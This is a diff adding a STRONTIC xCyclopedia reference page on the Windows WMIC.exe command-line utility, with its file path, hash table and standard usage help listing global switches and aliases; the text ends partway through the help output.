@@ -1,0 +1,906 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>WMIC.exe | WMI Commandline Utility &#124; STRONTIC</title>
+<meta name="description" content="What is WMIC.exe?">
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="STRONTIC">
+<meta property="og:title" content="WMIC.exe | WMI Commandline Utility">
+<meta property="og:url" content="https://strontic.github.io/xcyclopedia/library/WMIC.exe-A2EF3F0AD95FDA9262A5F9533B6DD1BD.html">
+
+
+  <meta property="og:description" content="What is WMIC.exe?">
+
+
+
+
+
+  <meta name="twitter:site" content="@strontic20">
+  <meta name="twitter:title" content="WMIC.exe | WMI Commandline Utility">
+  <meta name="twitter:description" content="What is WMIC.exe?">
+  <meta name="twitter:url" content="https://strontic.github.io/xcyclopedia/library/WMIC.exe-A2EF3F0AD95FDA9262A5F9533B6DD1BD.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+  
+
+  
+
+
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://strontic.github.io/xcyclopedia/library/WMIC.exe-A2EF3F0AD95FDA9262A5F9533B6DD1BD.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Organization",
+      "url": "https://strontic.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="STRONTIC Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--splash wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/strontic-favicon_large_gray.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          STRONTIC
+          <span class="site-subtitle">Security. Automation. Analytics.</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/xcyclopedia/intro">xCyclopedia</a>
+            </li><li class="masthead__menu-item">
+              <a href="https://github.com/strontic">Github</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://strontic.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+		
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/xcyclopedia" itemprop="item"><span itemprop="name">Xcyclopedia</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+		
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/xcyclopedia/library" itemprop="item"><span itemprop="name">Library</span></a>
+          <meta itemprop="position" content="3" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">WMIC.exe | WMI Commandline Utility</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  <article class="splash" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="            WMIC.exe      WMI Commandline Utility      ">
+    <meta itemprop="description" content="What is WMIC.exe?">
+    
+    
+
+    <section class="page__content" itemprop="text">
+      <h1 id="wmicexe">WMIC.exe</h1>
+
+<ul>
+  <li>File Path: <code class="language-plaintext highlighter-rouge">C:\Windows\system32\wbem\WMIC.exe</code></li>
+  <li>Description: WMI Commandline Utility</li>
+</ul>
+
+<h2 id="hashes">Hashes</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Hash</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MD5</td>
+      <td><code class="language-plaintext highlighter-rouge">A2EF3F0AD95FDA9262A5F9533B6DD1BD</code></td>
+    </tr>
+    <tr>
+      <td>SHA1</td>
+      <td><code class="language-plaintext highlighter-rouge">AA3047921E1821FC2959D0ED40191A7AFF33B6EC</code></td>
+    </tr>
+    <tr>
+      <td>SHA256</td>
+      <td><code class="language-plaintext highlighter-rouge">FA78C88DAC91FDF2EAC736E6900AC1EC4AB7A388B8F77A23FFA7E80A4AD29F5A</code></td>
+    </tr>
+    <tr>
+      <td>SHA384</td>
+      <td><code class="language-plaintext highlighter-rouge">83FB60616B354E148638A11FEBDB54B2CEDB6D0430138D6DD70B1BFFEBA60FE5B29A82D8D8D78DB9571C5E0E0AA5C9DE</code></td>
+    </tr>
+    <tr>
+      <td>SHA512</td>
+      <td><code class="language-plaintext highlighter-rouge">71C9B7F76AE68CA24C2B985D47509C5C5CA262A2A23FDADA63B35343C3482776539B5D958D92F7C53F79A91320555EB569E22D30B8CA83D94D555F7E5665CFC1</code></td>
+    </tr>
+    <tr>
+      <td>SSDEEP</td>
+      <td><code class="language-plaintext highlighter-rouge">6144:fSWq+ijIokIRywZYxCzEY5wfY0fvnnok/LFoCs4F/HPcoe/VLSztBKHGH5enh:KWptweFYi1ok6CsV/VLSDKHGH0nh</code></td>
+    </tr>
+    <tr>
+      <td>IMP</td>
+      <td><code class="language-plaintext highlighter-rouge">D8770F1C24B7AAD7B5CD1817B3FEB2AA</code></td>
+    </tr>
+    <tr>
+      <td>PESHA1</td>
+      <td><code class="language-plaintext highlighter-rouge">063C404BE48F1DFA34E01613FBC64D155580A6D1</code></td>
+    </tr>
+    <tr>
+      <td>PE256</td>
+      <td><code class="language-plaintext highlighter-rouge">C0A0014E734125EA5871831823EE0D2E91B36CF8293F263FCE3D8E8AD62ED3A2</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="runtime-data">Runtime Data</h2>
+
+<h3 id="usage-stdout">Usage (stdout):</h3>
+<div class="language-cmhg highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ni">WMIC</span> <span class="ni">is</span> <span class="ni">deprecated</span><span class="err">.</span>
+
+<span class="err">[</span><span class="ni">global</span> <span class="ni">switches</span><span class="err">]</span> <span class="err">&lt;</span><span class="ni">command</span><span class="err">&gt;</span>
+
+<span class="ni">The</span> <span class="ni">following</span> <span class="ni">global</span> <span class="ni">switches</span> <span class="ni">are</span> <span class="kd">available:</span>
+<span class="p">/</span><span class="ni">NAMESPACE</span>           <span class="ni">Path</span> <span class="ni">for</span> <span class="ni">the</span> <span class="ni">namespace</span> <span class="ni">the</span> <span class="ni">alias</span> <span class="ni">operate</span> <span class="ni">against</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">ROLE</span>                <span class="ni">Path</span> <span class="ni">for</span> <span class="ni">the</span> <span class="ni">role</span> <span class="ni">containing</span> <span class="ni">the</span> <span class="ni">alias</span> <span class="ni">definitions</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">NODE</span>                <span class="ni">Servers</span> <span class="ni">the</span> <span class="ni">alias</span> <span class="ni">will</span> <span class="ni">operate</span> <span class="ni">against</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">IMPLEVEL</span>            <span class="ni">Client</span> <span class="ni">impersonation</span> <span class="ni">level</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">AUTHLEVEL</span>           <span class="ni">Client</span> <span class="ni">authentication</span> <span class="ni">level</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">LOCALE</span>              <span class="ni">Language</span> <span class="ni">id</span> <span class="ni">the</span> <span class="ni">client</span> <span class="ni">should</span> <span class="ni">use</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">PRIVILEGES</span>          <span class="ni">Enable</span> <span class="ni">or</span> <span class="ni">disable</span> <span class="ni">all</span> <span class="ni">privileges</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">TRACE</span>               <span class="ni">Outputs</span> <span class="ni">debugging</span> <span class="ni">information</span> <span class="ni">to</span> <span class="ni">stderr</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">RECORD</span>              <span class="ni">Logs</span> <span class="ni">all</span> <span class="ni">input</span> <span class="ni">commands</span> <span class="ni">and</span> <span class="ni">output</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">INTERACTIVE</span>         <span class="ni">Sets</span> <span class="ni">or</span> <span class="ni">resets</span> <span class="ni">the</span> <span class="ni">interactive</span> <span class="ni">mode</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">FAILFAST</span>            <span class="ni">Sets</span> <span class="ni">or</span> <span class="ni">resets</span> <span class="ni">the</span> <span class="ni">FailFast</span> <span class="ni">mode</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">USER</span>                <span class="ni">User</span> <span class="ni">to</span> <span class="ni">be</span> <span class="ni">used</span> <span class="ni">during</span> <span class="ni">the</span> <span class="ni">session</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">PASSWORD</span>            <span class="ni">Password</span> <span class="ni">to</span> <span class="ni">be</span> <span class="ni">used</span> <span class="ni">for</span> <span class="ni">session</span> <span class="ni">login</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">OUTPUT</span>              <span class="ni">Specifies</span> <span class="ni">the</span> <span class="ni">mode</span> <span class="ni">for</span> <span class="ni">output</span> <span class="ni">redirection</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">APPEND</span>              <span class="ni">Specifies</span> <span class="ni">the</span> <span class="ni">mode</span> <span class="ni">for</span> <span class="ni">output</span> <span class="ni">redirection</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">AGGREGATE</span>           <span class="ni">Sets</span> <span class="ni">or</span> <span class="ni">resets</span> <span class="ni">aggregate</span> <span class="ni">mode</span><span class="err">.</span>
+<span class="p">/</span><span class="ni">AUTHORITY</span>           <span class="ni">Specifies</span> <span class="ni">the</span> <span class="err">&lt;</span><span class="ni">authority</span> <span class="ni">type</span><span class="err">&gt;</span> <span class="ni">for</span> <span class="ni">the</span> <span class="ni">connection</span><span class="err">.</span>
+<span class="p">/</span><span class="err">?[:&lt;</span><span class="ni">BRIEF</span><span class="err">|</span><span class="ni">FULL</span><span class="err">&gt;]</span>    <span class="ni">Usage</span> <span class="ni">information</span><span class="err">.</span>
+
+<span class="ni">For</span> <span class="ni">more</span> <span class="ni">information</span> <span class="ni">on</span> <span class="err">a</span> <span class="ni">specific</span> <span class="ni">global</span> <span class="ni">switch</span><span class="p">,</span> <span class="kd">type:</span> <span class="ni">switch</span><span class="err">-</span><span class="ni">name</span> <span class="p">/</span><span class="err">?</span>
+
+
+<span class="ni">The</span> <span class="ni">following</span> <span class="ni">alias</span><span class="p">/</span><span class="ni">es</span> <span class="ni">are</span> <span class="ni">available</span> <span class="ni">in</span> <span class="ni">the</span> <span class="ni">current</span> <span class="kd">role:</span>
+<span class="ni">ALIAS</span>                    <span class="err">-</span> <span class="ni">Access</span> <span class="ni">to</span> <span class="ni">the</span> <span class="ni">aliases</span> <span class="ni">available</span> <span class="ni">on</span> <span class="ni">the</span> <span class="ni">local</span> <span class="ni">system</span>
+<span class="ni">BASEBOARD</span>                <span class="err">-</span> <span class="ni">Base</span> <span class="ni">board</span> <span class="p">(</span><span class="ni">also</span> <span class="ni">known</span> <span class="ni">as</span> <span class="err">a</span> <span class="ni">motherboard</span> <span class="ni">or</span> <span class="ni">system</span> <span class="ni">board</span><span class="p">)</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">BIOS</span>                     <span class="err">-</span> <span class="ni">Basic</span> <span class="ni">input</span><span class="p">/</span><span class="ni">output</span> <span class="ni">services</span> <span class="p">(</span><span class="ni">BIOS</span><span class="p">)</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">BOOTCONFIG</span>               <span class="err">-</span> <span class="ni">Boot</span> <span class="ni">configuration</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">CDROM</span>                    <span class="err">-</span> <span class="ni">CD</span><span class="err">-</span><span class="ni">ROM</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">COMPUTERSYSTEM</span>           <span class="err">-</span> <span class="ni">Computer</span> <span class="ni">system</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">CPU</span>                      <span class="err">-</span> <span class="ni">CPU</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">CSPRODUCT</span>                <span class="err">-</span> <span class="ni">Computer</span> <span class="ni">system</span> <span class="ni">product</span> <span class="ni">information</span> <span class="ni">from</span> <span class="ni">SMBIOS</span><span class="err">.</span> 
+<span class="ni">DATAFILE</span>                 <span class="err">-</span> <span class="ni">DataFile</span> <span class="ni">Management</span><span class="err">.</span>  
+<span class="ni">DCOMAPP</span>                  <span class="err">-</span> <span class="ni">DCOM</span> <span class="ni">Application</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">DESKTOP</span>                  <span class="err">-</span> <span class="ni">User</span><span class="err">'s</span> <span class="ni">Desktop</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">DESKTOPMONITOR</span>           <span class="err">-</span> <span class="ni">Desktop</span> <span class="ni">Monitor</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">DEVICEMEMORYADDRESS</span>      <span class="err">-</span> <span class="ni">Device</span> <span class="ni">memory</span> <span class="ni">addresses</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">DISKDRIVE</span>                <span class="err">-</span> <span class="ni">Physical</span> <span class="ni">disk</span> <span class="ni">drive</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">DISKQUOTA</span>                <span class="err">-</span> <span class="ni">Disk</span> <span class="ni">space</span> <span class="ni">usage</span> <span class="ni">for</span> <span class="ni">NTFS</span> <span class="ni">volumes</span><span class="err">.</span>
+<span class="ni">DMACHANNEL</span>               <span class="err">-</span> <span class="ni">Direct</span> <span class="ni">memory</span> <span class="ni">access</span> <span class="p">(</span><span class="ni">DMA</span><span class="p">)</span> <span class="ni">channel</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">ENVIRONMENT</span>              <span class="err">-</span> <span class="ni">System</span> <span class="ni">environment</span> <span class="ni">settings</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">FSDIR</span>                    <span class="err">-</span> <span class="ni">Filesystem</span> <span class="ni">directory</span> <span class="ni">entry</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">GROUP</span>                    <span class="err">-</span> <span class="ni">Group</span> <span class="ni">account</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">IDECONTROLLER</span>            <span class="err">-</span> <span class="ni">IDE</span> <span class="ni">Controller</span> <span class="ni">management</span><span class="err">.</span>  
+<span class="ni">IRQ</span>                      <span class="err">-</span> <span class="ni">Interrupt</span> <span class="ni">request</span> <span class="ni">line</span> <span class="p">(</span><span class="ni">IRQ</span><span class="p">)</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">JOB</span>                      <span class="err">-</span> <span class="ni">Provides</span>  <span class="ni">access</span> <span class="ni">to</span> <span class="ni">the</span> <span class="ni">jobs</span> <span class="ni">scheduled</span> <span class="ni">using</span> <span class="ni">the</span> <span class="ni">schedule</span> <span class="ni">service</span><span class="err">.</span> 
+<span class="ni">LOADORDER</span>                <span class="err">-</span> <span class="ni">Management</span> <span class="ni">of</span> <span class="ni">system</span> <span class="ni">services</span> <span class="ni">that</span> <span class="ni">define</span> <span class="ni">execution</span> <span class="ni">dependencies</span><span class="err">.</span> 
+<span class="ni">LOGICALDISK</span>              <span class="err">-</span> <span class="ni">Local</span> <span class="ni">storage</span> <span class="ni">device</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">LOGON</span>                    <span class="err">-</span> <span class="ni">LOGON</span> <span class="ni">Sessions</span><span class="err">.</span>  
+<span class="ni">MEMCACHE</span>                 <span class="err">-</span> <span class="ni">Cache</span> <span class="ni">memory</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">MEMORYCHIP</span>               <span class="err">-</span> <span class="ni">Memory</span> <span class="ni">chip</span> <span class="ni">information</span><span class="err">.</span>
+<span class="ni">MEMPHYSICAL</span>              <span class="err">-</span> <span class="ni">Computer</span> <span class="ni">system</span><span class="err">'s</span> <span class="ni">physical</span> <span class="ni">memory</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">NETCLIENT</span>                <span class="err">-</span> <span class="ni">Network</span> <span class="ni">Client</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">NETLOGIN</span>                 <span class="err">-</span> <span class="ni">Network</span> <span class="ni">login</span> <span class="ni">information</span> <span class="p">(</span><span class="ni">of</span> <span class="err">a</span> <span class="ni">particular</span> <span class="ni">user</span><span class="p">)</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">NETPROTOCOL</span>              <span class="err">-</span> <span class="ni">Protocols</span> <span class="p">(</span><span class="ni">and</span> <span class="ni">their</span> <span class="ni">network</span> <span class="ni">characteristics</span><span class="p">)</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">NETUSE</span>                   <span class="err">-</span> <span class="ni">Active</span> <span class="ni">network</span> <span class="ni">connection</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">NIC</span>                      <span class="err">-</span> <span class="ni">Network</span> <span class="ni">Interface</span> <span class="ni">Controller</span> <span class="p">(</span><span class="ni">NIC</span><span class="p">)</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">NICCONFIG</span>                <span class="err">-</span> <span class="ni">Network</span> <span class="ni">adapter</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">NTDOMAIN</span>                 <span class="err">-</span> <span class="ni">NT</span> <span class="ni">Domain</span> <span class="ni">management</span><span class="err">.</span>  
+<span class="ni">NTEVENT</span>                  <span class="err">-</span> <span class="ni">Entries</span> <span class="ni">in</span> <span class="ni">the</span> <span class="ni">NT</span> <span class="ni">Event</span> <span class="ni">Log</span><span class="err">.</span>  
+<span class="ni">NTEVENTLOG</span>               <span class="err">-</span> <span class="ni">NT</span> <span class="ni">eventlog</span> <span class="ni">file</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">ONBOARDDEVICE</span>            <span class="err">-</span> <span class="ni">Management</span> <span class="ni">of</span> <span class="ni">common</span> <span class="ni">adapter</span> <span class="ni">devices</span> <span class="ni">built</span> <span class="ni">into</span> <span class="ni">the</span> <span class="ni">motherboard</span> <span class="p">(</span><span class="ni">system</span> <span class="ni">board</span><span class="p">)</span><span class="err">.</span>
+<span class="ni">OS</span>                       <span class="err">-</span> <span class="ni">Installed</span> <span class="ni">Operating</span> <span class="ni">System</span><span class="p">/</span><span class="err">s</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">PAGEFILE</span>                 <span class="err">-</span> <span class="ni">Virtual</span> <span class="ni">memory</span> <span class="ni">file</span> <span class="ni">swapping</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">PAGEFILESET</span>              <span class="err">-</span> <span class="ni">Page</span> <span class="ni">file</span> <span class="ni">settings</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">PARTITION</span>                <span class="err">-</span> <span class="ni">Management</span> <span class="ni">of</span> <span class="ni">partitioned</span> <span class="ni">areas</span> <span class="ni">of</span> <span class="err">a</span> <span class="ni">physical</span> <span class="ni">disk</span><span class="err">.</span>
+<span class="ni">PORT</span>                     <span class="err">-</span> <span class="err">I</span><span class="p">/</span><span class="err">O</span> <span class="ni">port</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">PORTCONNECTOR</span>            <span class="err">-</span> <span class="ni">Physical</span> <span class="ni">connection</span> <span class="ni">ports</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">PRINTER</span>                  <span class="err">-</span> <span class="ni">Printer</span> <span class="ni">device</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">PRINTERCONFIG</span>            <span class="err">-</span> <span class="ni">Printer</span> <span class="ni">device</span> <span class="ni">configuration</span> <span class="ni">management</span><span class="err">.</span>  
+<span class="ni">PRINTJOB</span>                 <span class="err">-</span> <span class="ni">Print</span> <span class="ni">job</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">PROCESS</span>                  <span class="err">-</span> <span class="ni">Process</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">PRODUCT</span>                  <span class="err">-</span> <span class="ni">Installation</span> <span class="ni">package</span> <span class="ni">task</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">QFE</span>                      <span class="err">-</span> <span class="ni">Quick</span> <span class="ni">Fix</span> <span class="ni">Engineering</span><span class="err">.</span>  
+<span class="ni">QUOTASETTING</span>             <span class="err">-</span> <span class="ni">Setting</span> <span class="ni">information</span> <span class="ni">for</span> <span class="ni">disk</span> <span class="ni">quotas</span> <span class="ni">on</span> <span class="err">a</span> <span class="ni">volume</span><span class="err">.</span> 
+<span class="ni">RDACCOUNT</span>                <span class="err">-</span> <span class="ni">Remote</span> <span class="ni">Desktop</span> <span class="ni">connection</span> <span class="ni">permission</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">RDNIC</span>                    <span class="err">-</span> <span class="ni">Remote</span> <span class="ni">Desktop</span> <span class="ni">connection</span> <span class="ni">management</span> <span class="ni">on</span> <span class="err">a</span> <span class="ni">specific</span> <span class="ni">network</span> <span class="ni">adapter</span><span class="err">.</span>
+<span class="ni">RDPERMISSIONS</span>            <span class="err">-</span> <span class="ni">Permissions</span> <span class="ni">to</span> <span class="err">a</span> <span class="ni">specific</span> <span class="ni">Remote</span> <span class="ni">Desktop</span> <span class="ni">connection</span><span class="err">.</span>
+<span class="ni">RDTOGGLE</span>                 <span class="err">-</span> <span class="ni">Turning</span> <span class="ni">Remote</span> <span class="ni">Desktop</span> <span class="ni">listener</span> <span class="ni">on</span> <span class="ni">or</span> <span class="ni">off</span> <span class="ni">remotely</span><span class="err">.</span>
+<span class="ni">RECOVEROS</span>                <span class="err">-</span> <span class="ni">Information</span> <span class="ni">that</span> <span class="ni">will</span> <span class="ni">be</span> <span class="ni">gathered</span> <span class="ni">from</span> <span class="ni">memory</span> <span class="ni">when</span> <span class="ni">the</span> <span class="ni">operating</span> <span class="ni">system</span> <span class="ni">fails</span><span class="err">.</span> 
+<span class="ni">REGISTRY</span>                 <span class="err">-</span> <span class="ni">Computer</span> <span class="ni">system</span> <span class="ni">registry</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">SCSICONTROLLER</span>           <span class="err">-</span> <span class="ni">SCSI</span> <span class="ni">Controller</span> <span class="ni">management</span><span class="err">.</span>  
+<span class="ni">SERVER</span>                   <span class="err">-</span> <span class="ni">Server</span> <span class="ni">information</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">SERVICE</span>                  <span class="err">-</span> <span class="ni">Service</span> <span class="ni">application</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">SHADOWCOPY</span>               <span class="err">-</span> <span class="ni">Shadow</span> <span class="ni">copy</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">SHADOWSTORAGE</span>            <span class="err">-</span> <span class="ni">Shadow</span> <span class="ni">copy</span> <span class="ni">storage</span> <span class="ni">area</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">SHARE</span>                    <span class="err">-</span> <span class="ni">Shared</span> <span class="ni">resource</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">SOFTWAREELEMENT</span>          <span class="err">-</span> <span class="ni">Management</span> <span class="ni">of</span> <span class="ni">the</span>  <span class="ni">elements</span> <span class="ni">of</span> <span class="err">a</span> <span class="ni">software</span> <span class="ni">product</span> <span class="ni">installed</span> <span class="ni">on</span> <span class="err">a</span> <span class="ni">system</span><span class="err">.</span>
+<span class="ni">SOFTWAREFEATURE</span>          <span class="err">-</span> <span class="ni">Management</span> <span class="ni">of</span> <span class="ni">software</span> <span class="ni">product</span> <span class="ni">subsets</span> <span class="ni">of</span> <span class="ni">SoftwareElement</span><span class="err">.</span> 
+<span class="ni">SOUNDDEV</span>                 <span class="err">-</span> <span class="ni">Sound</span> <span class="ni">Device</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">STARTUP</span>                  <span class="err">-</span> <span class="ni">Management</span> <span class="ni">of</span> <span class="ni">commands</span> <span class="ni">that</span> <span class="ni">run</span> <span class="ni">automatically</span> <span class="ni">when</span> <span class="ni">users</span> <span class="ni">log</span> <span class="ni">onto</span> <span class="ni">the</span> <span class="ni">computer</span> <span class="ni">system</span><span class="err">.</span>
+<span class="ni">SYSACCOUNT</span>               <span class="err">-</span> <span class="ni">System</span> <span class="ni">account</span> <span class="ni">management</span><span class="err">.</span>  
+<span class="ni">SYSDRIVER</span>                <span class="err">-</span> <span class="ni">Management</span> <span class="ni">of</span> <span class="ni">the</span> <span class="ni">system</span> <span class="ni">driver</span> <span class="ni">for</span> <span class="err">a</span> <span class="ni">base</span> <span class="ni">service</span><span class="err">.</span>
+<span class="ni">SYSTEMENCLOSURE</span>          <span class="err">-</span> <span class="ni">Physical</span> <span class="ni">system</span> <span class="ni">enclosure</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">SYSTEMSLOT</span>               <span class="err">-</span> <span class="ni">Management</span> <span class="ni">of</span> <span class="ni">physical</span> <span class="ni">connection</span> <span class="ni">points</span> <span class="ni">including</span> <span class="ni">ports</span><span class="p">,</span>  <span class="ni">slots</span> <span class="ni">and</span> <span class="ni">peripherals</span><span class="p">,</span> <span class="ni">and</span> <span class="ni">proprietary</span> <span class="ni">connections</span> <span class="ni">points</span><span class="err">.</span>
+<span class="ni">TAPEDRIVE</span>                <span class="err">-</span> <span class="ni">Tape</span> <span class="ni">drive</span> <span class="ni">management</span><span class="err">.</span>  
+<span class="ni">TEMPERATURE</span>              <span class="err">-</span> <span class="ni">Data</span> <span class="ni">management</span> <span class="ni">of</span> <span class="err">a</span> <span class="ni">temperature</span> <span class="ni">sensor</span> <span class="p">(</span><span class="ni">electronic</span> <span class="ni">thermometer</span><span class="p">)</span><span class="err">.</span>
+<span class="ni">TIMEZONE</span>                 <span class="err">-</span> <span class="ni">Time</span> <span class="ni">zone</span> <span class="ni">data</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">UPS</span>                      <span class="err">-</span> <span class="ni">Uninterruptible</span> <span class="ni">power</span> <span class="ni">supply</span> <span class="p">(</span><span class="ni">UPS</span><span class="p">)</span> <span class="ni">management</span><span class="err">.</span> 
+<span class="ni">USERACCOUNT</span>              <span class="err">-</span> <span class="ni">User</span> <span class="ni">account</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">VOLTAGE</span>                  <span class="err">-</span> <span class="ni">Voltage</span> <span class="ni">sensor</span> <span class="p">(</span><span class="ni">electronic</span> <span class="ni">voltmeter</span><span class="p">)</span> <span class="ni">data</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">VOLUME</span>                   <span class="err">-</span> <span class="ni">Local</span> <span class="ni">storage</span> <span class="ni">volume</span> <span class="ni">management</span><span class="err">.</span>
